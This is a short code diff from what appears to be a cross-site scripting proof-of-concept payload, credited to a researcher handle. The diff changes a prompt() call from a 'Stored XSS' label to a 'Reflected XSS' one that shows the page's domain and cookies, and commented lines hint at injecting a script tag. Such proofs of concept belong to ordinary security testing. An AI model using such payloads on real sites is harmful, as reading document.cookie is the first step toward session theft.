@@ -6,7 +6,7 @@
     // document.head.appendChild(script);
     
         // Your XSS payload or any other actions
-    prompt("Stored XSS by Supakiad S. (m3ez):", document.domain);
+    prompt("Reflected XSS by Supakiad S. (m3ez): " + document.domain, document.cookie);
     // prompt("Stored XSS Popup Cookies:", document.cookie);
 
 
